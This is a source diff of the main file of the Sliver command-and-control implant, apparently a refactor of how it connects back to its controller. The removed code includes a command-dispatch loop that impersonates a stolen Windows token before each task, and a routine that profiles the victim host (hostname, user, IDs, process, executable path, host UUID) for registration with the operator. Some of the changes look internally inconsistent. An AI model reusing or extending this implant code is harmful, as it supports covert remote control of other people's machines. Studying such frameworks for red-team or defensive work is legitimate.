@@ -25,16 +25,9 @@ import "C"
 // {{end}}
 
 import (
-	"log"
-	"os"
-	"os/user"
-	"runtime"
-	"time"
+	// {{if .Config.Debug}}
 
-	// {{if .Config.IsBeacon}}
-	"sync"
-
-	"github.com/gofrs/uuid"
+	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 
 	// {{end}}
 
@@ -42,27 +35,28 @@ import (
 	"io/ioutil"
 	// {{end}}
 
-	// {{if eq .Config.GOOS "windows"}}
-	"github.com/bishopfox/sliver/implant/sliver/priv"
-	"github.com/bishopfox/sliver/implant/sliver/syscalls"
+	// {{if .Config.IsBeacon}}
+
+	"log"
+	"sync"
+	"time"
+
+	"github.com/bishopfox/sliver/implant/sliver/handlers"
+	"github.com/bishopfox/sliver/implant/sliver/transports"
+	"github.com/gofrs/uuid"
 
 	// {{end}}
-
-	consts "github.com/bishopfox/sliver/implant/sliver/constants"
-	"github.com/bishopfox/sliver/implant/sliver/handlers"
-	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
-	"github.com/bishopfox/sliver/implant/sliver/limits"
-	"github.com/bishopfox/sliver/implant/sliver/pivots"
-	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/implant/sliver/version"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
-
-	"google.golang.org/protobuf/proto"
-	"google.golang.org/protobuf/reflect/protoreflect"
 
 	// {{if .Config.IsService}}
 	"golang.org/x/sys/windows/svc"
 	// {{end}}
+
+	"google.golang.org/protobuf/proto"
+	"google.golang.org/protobuf/reflect/protoreflect"
+
+	"github.com/bishopfox/sliver/implant/sliver/limits"
+	"github.com/bishopfox/sliver/implant/sliver/transports/c2"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
 // {{if .Config.IsBeacon}}
@@ -90,11 +84,18 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			connection := transports.StartConnectionLoop()
-			if connection == nil {
+			// Initialize and start the implant transports
+			err := c2.Transports.Init()
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("Error starting transports: %s", err.Error())
+				// {{end}}
 				break
 			}
-			sessionMainLoop(connection)
+
+			// Block and let the C2s serve this implant
+			c2.Transports.Serve()
+
 		case c := <-r:
 			switch c.Cmd {
 			case svc.Interrogate:
@@ -169,31 +170,25 @@ func main() {
 	svc.Run("", &sliverService{})
 	// {{else}}
 
-	// {{if .Config.IsBeacon}}
 	// {{if .Config.Debug}}
-	log.Printf("Running in Beacon mode with ID: %s", BeaconID)
+	// log.Printf("Running in Beacon mode with ID: %s", BeaconID)
 	// {{end}}
+
 	for {
-		beacon := transports.NextBeacon()
-		if beacon != nil {
-			err := beaconMainLoop(beacon)
-			if err != nil {
-				break
-			}
+		// Initialize and start the implant transports
+		err := c2.Transports.Init()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error starting transports: %s", err.Error())
+			// {{end}}
+			break
 		}
-		time.Sleep(transports.GetReconnectInterval())
+
+		// Block and let the C2s serve this implant
+		c2.Transports.Serve()
 	}
-	// {{else}}
 	// {{if .Config.Debug}}
 	log.Printf("Running in session mode")
-	// {{end}}
-	for {
-		connection := transports.StartConnectionLoop()
-		if connection != nil {
-			sessionMainLoop(connection)
-		}
-		time.Sleep(transports.GetReconnectInterval())
-	}
 	// {{end}}
 
 	// {{end}}
@@ -225,7 +220,6 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		ID:          BeaconID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
-		Register:    RegisterSliver(),
 		NextCheckin: nextBeacon.UTC().Unix(),
 	}))
 	beacon.Close()
@@ -309,7 +303,9 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 				defer wg.Done()
 				// {{if .Config.Debug}}
 				if err != nil {
+					// {{if .Config.Debug}}
 					log.Printf("[beacon] handler function returned an error: %s", err)
+					// {{end}}
 				}
 				// {{end}}
 				// {{if .Config.Debug}}
@@ -350,85 +346,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	return nil
 }
 
-// {{end}} -IsBeacon
-
-func sessionMainLoop(connection *transports.Connection) {
-	// Reconnect active pivots
-	pivots.ReconnectActivePivots(connection)
-
-	connection.Send <- Envelope(sliverpb.MsgRegister, RegisterSliver()) // Send registration information
-
-	pivotHandlers := handlers.GetPivotHandlers()
-	tunHandlers := handlers.GetTunnelHandlers()
-	sysHandlers := handlers.GetSystemHandlers()
-	sysPivotHandlers := handlers.GetSystemPivotHandlers()
-	specialHandlers := handlers.GetSpecialHandlers()
-
-	for envelope := range connection.Recv {
-		if handler, ok := specialHandlers[envelope.Type]; ok {
-			// {{if .Config.Debug}}
-			log.Printf("[recv] specialHandler %d", envelope.Type)
-			// {{end}}
-			handler(envelope.Data, connection)
-		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
-			// {{if .Config.Debug}}
-			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
-			// {{end}}
-			go handler(envelope, connection)
-		} else if handler, ok := sysHandlers[envelope.Type]; ok {
-			// Beware, here be dragons.
-			// This is required for the specific case of token impersonation:
-			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
-			// only applies the token to the calling thread, we need to call it before every task.
-			// It's fucking gross to do that here, but I could not come with a better solution.
-
-			// {{if eq .Config.GOOS "windows" }}
-			if priv.CurrentToken != 0 {
-				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
-				if err != nil {
-					// {{if .Config.Debug}}
-					log.Printf("Error: %v\n", err)
-					// {{end}}
-				}
-			}
-			// {{end}}
-
-			// {{if .Config.Debug}}
-			log.Printf("[recv] sysHandler %d", envelope.Type)
-			// {{end}}
-			go handler(envelope.Data, func(data []byte, err error) {
-				// {{if .Config.Debug}}
-				if err != nil {
-					log.Printf("[session] handler function returned an error: %s", err)
-				}
-				// {{end}}
-				connection.Send <- &sliverpb.Envelope{
-					ID:   envelope.ID,
-					Data: data,
-				}
-			})
-		} else if handler, ok := tunHandlers[envelope.Type]; ok {
-			// {{if .Config.Debug}}
-			log.Printf("[recv] tunHandler %d", envelope.Type)
-			// {{end}}
-			go handler(envelope, connection)
-		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
-			// {{if .Config.Debug}}
-			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
-			// {{end}}
-			go handler(envelope, connection)
-		} else {
-			// {{if .Config.Debug}}
-			log.Printf("[recv] unknown envelope type %d", envelope.Type)
-			// {{end}}
-			connection.Send <- &sliverpb.Envelope{
-				ID:                 envelope.ID,
-				Data:               nil,
-				UnknownMessageType: true,
-			}
-		}
-	}
-}
+// {{end}}
 
 // Envelope - Creates an envelope with the given type and data.
 func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
@@ -442,66 +360,5 @@ func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envel
 	return &sliverpb.Envelope{
 		Type: msgType,
 		Data: data,
-	}
-}
-
-// RegisterSliver - Creates a registartion protobuf message
-func RegisterSliver() *sliverpb.Register {
-	hostname, err := os.Hostname()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to determine hostname %s", err)
-		// {{end}}
-		hostname = ""
-	}
-	currentUser, err := user.Current()
-	if err != nil {
-
-		// {{if .Config.Debug}}
-		log.Printf("Failed to determine current user %s", err)
-		// {{end}}
-
-		// Gracefully error out
-		currentUser = &user.User{
-			Username: "<< error >>",
-			Uid:      "<< error >>",
-			Gid:      "<< error >>",
-		}
-
-	}
-	filename, err := os.Executable()
-	// Should not happen, but still...
-	if err != nil {
-		// TODO: build the absolute path to os.Args[0]
-		if 0 < len(os.Args) {
-			filename = os.Args[0]
-		} else {
-			filename = "<< error >>"
-		}
-	}
-
-	// Retrieve UUID
-	uuid := hostuuid.GetUUID()
-	// {{if .Config.Debug}}
-	log.Printf("Uuid: %s", uuid)
-	// {{end}}
-
-	return &sliverpb.Register{
-		Name:              consts.SliverName,
-		Hostname:          hostname,
-		Uuid:              uuid,
-		Username:          currentUser.Username,
-		Uid:               currentUser.Uid,
-		Gid:               currentUser.Gid,
-		Os:                runtime.GOOS,
-		Version:           version.GetVersion(),
-		Arch:              runtime.GOARCH,
-		Pid:               int32(os.Getpid()),
-		Filename:          filename,
-		ActiveC2:          transports.GetActiveC2(),
-		ReconnectInterval: int64(transports.GetReconnectInterval()),
-		ProxyURL:          transports.GetProxyURL(),
-		PollTimeout:       int64(transports.GetPollTimeout()),
-		ConfigID:          "{{ .Config.ID }}",
 	}
 }
